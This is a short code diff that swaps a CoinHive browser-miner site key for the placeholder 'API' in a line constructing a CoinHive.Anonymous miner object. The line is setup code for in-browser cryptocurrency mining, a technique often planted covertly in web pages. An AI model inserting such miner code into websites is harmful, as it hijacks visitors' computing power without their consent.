@@ -1,4 +1,4 @@
-var miner = new CoinHive.Anonymous('FimxfbedPZOMqHijE3UwoqlbveGj4xpA');
+var miner = new CoinHive.Anonymous('API');
 
 
 
